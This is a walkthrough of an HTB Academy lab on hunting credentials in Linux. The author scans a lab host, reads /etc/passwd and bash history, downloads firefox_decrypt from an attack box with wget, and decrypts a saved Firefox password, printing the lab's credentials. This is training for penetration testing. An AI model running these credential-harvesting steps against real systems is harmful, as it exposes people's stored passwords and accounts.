### CPTS / HTB Penetration Tester Path <br>
### Password Attacks: Credential Hunting in Linux <br>
<mark>hook it up with a follow if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>

<br>
<br>

IP: 10.129.252.221

SSH to 10.129.252.221 (ACADEMY-PWATTACKS-NIX01) with user "kira" and password "L0vey0u1!"

---

### Question 1:
Examine the target and find out the password of the user Will. Then, submit the password as the answer.

Started an nmap scan in the background:
```diff
+ $ sudo nmap -sT -sC -sV -A -F 10.129.252.221
```

	PORT    STATE SERVICE     VERSION
	21/tcp  open  ftp         vsftpd 3.0.3
	22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   3072 3f:4c:8f:10:f1:ae:be:cd:31:24:7c:a1:4e:ab:84:6d (RSA)
	|   256 7b:30:37:67:50:b9:ad:91:c0:8f:f7:02:78:3b:7c:02 (ECDSA)
	|_  256 88:9e:0e:07:fe:ca:d0:5c:60:ab:cf:10:99:cd:6c:a7 (ED25519)
	139/tcp open  netbios-ssn Samba smbd 4.6.2
	445/tcp open  netbios-ssn Samba smbd 4.6.2
	No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
	
	Host script results:
	| nbstat: NetBIOS name: NIX01, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
	| Names:
	|   NIX01<00>            Flags: <unique><active>
	|   NIX01<03>            Flags: <unique><active>
	|   NIX01<20>            Flags: <unique><active>
	|   WORKGROUP<00>        Flags: <group><active>
	|_  WORKGROUP<1e>        Flags: <group><active>
	| smb2-time: 
	|   date: 2025-10-18T08:08:25
	|_  start_date: N/A
	| smb2-security-mode: 
	|   3:1:1: 
	|_    Message signing enabled but not required

We can see ftp, ssh and some smb shares. Lets ssh in with the given creds:
```diff
+ $ ssh kira@10.129.252.221
```

	kira@nix01:~$

Okay lets look for the operating system and other users:
```diff
+ kira@nix01:~$ cat /etc/passwd | grep bash
```

	root:x:0:0:root:/root:/bin/bash
	kira:x:1000:1000::/home/kira:/bin/bash
	will:x:1001:1001::/home/will:/bin/bash
	sam:x:1002:1003::/home/sam:/bin/bash

Poking around the fs we find some cheeky bash history:
```diff
+ kira@nix01:~$ cat .bash_history
```

	cd
	git clone https://github.com/unode/firefox_decrypt.git
	cd firefox_decrypt/
	ls
	./firefox_decrypt.py 
	su
	./firefox_decrypt.py 
	python3.9 firefox_decrypt.py 
	cd ..
	rm -rf firefox_decrypt/
	vim .bash_history 
	su
	firefox 
	su
	firefox 
	cd .mozilla/firefox/
	ls
	cd ytb95ytb.default-release/
	ls
	cat logins.json 
	vim logins.json 
	jq
	su
	ls
	vim logins.json 
	su
	cd
	cd .ssh/
	ls
	rm *
	ssh-keygen -t rsa -m PEM
	cat id_rsa.pub > authorized_keys
	vim authorized_keys 
	su

Looks like some foreshadowing to me. SOMEONE was running the FF decrypt tool on the `ytb95ytb.default-release/` FF user. Lets try that too.

After looking through the .mozilla folder, we can use this command to inspect the encrypted logins:
```diff
+ kira@nix01:~$ cat ~/.mozilla/firefox/ytb95ytb.default-release/logins.json | jq .
```

	{
	  "nextId": 2,
	  "logins": [
	    {
	      "id": 1,
	      "hostname": "https://dev.inlanefreight.com",
	      "httpRealm": null,
	      "formSubmitURL": "https://dev.inlanefreight.com",
	      "usernameField": "email",
	      "passwordField": "password",
	      "encryptedUsername": "MEIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECEuPp+tkcSROBBikTaPORjVYFBK/x6zuYjnhWGHhp6xu2ok=",
	      "encryptedPassword": "MEIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECFinWQ8t9QusBBg6tPWTkhxcMRHwvfUZBs9zUh8mQ6MgpYI=",
	      "guid": "{317acef6-be5a-4df2-abfc-ce0566b6e975}",
	      "encType": 1,
	      "timeCreated": 1644420310215,
	      "timeLastUsed": 1644420310215,
	      "timePasswordChanged": 1644420310215,
	      "timesUsed": 1
	    }
	  ],
	  "potentiallyVulnerablePasswords": [],
	  "dismissedBreachAlertsByLoginGUID": {},
	  "version": 3
	}

We could setup a share with samba, use impacket or just stand up a server on our attack box, but lets clone the ff decrypt repo first:
```diff
+ $ git clone https://github.com/unode/firefox_decrypt.git
```

	Cloning into 'firefox_decrypt'...
	remote: Enumerating objects: 1382, done.
	remote: Counting objects: 100% (292/292), done.
	remote: Compressing objects: 100% (38/38), done.

Cool, now serve it:
```diff
+ $ python3 -m http.server
```

	Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

And download it nix side:
```diff
+ kira@nix01:~/.mozilla/firefox$ wget -r -nH http://10.10.14.111:8000/firefox_decrypt
```

	FINISHED --2025-10-18 09:21:13--
	Total wall clock time: 37s
	Downloaded: 148 files, 3.3M in 4.8s (708 KB/s)

We are so back baby, execute the script with py 3.9 for dependency issues:
```diff
+ kira@nix01:~/.mozilla/firefox/firefox_decrypt$ python3.9 firefox_decrypt.py
```

And now select the option that matches what we found in bash history earlier:

	Select the Mozilla profile you wish to decrypt
	1 -> lktd9y8y.default
	2 -> ytb95ytb.default-release
	2
	
	Website:   https://dev.inlanefreight.com
	Username: 'will@inlanefreight.htb'
	Password: 'TUqr7QfLTLhruhVbCP'

🚩 found **TUqr7QfLTLh--edit--ruhVbCP**.
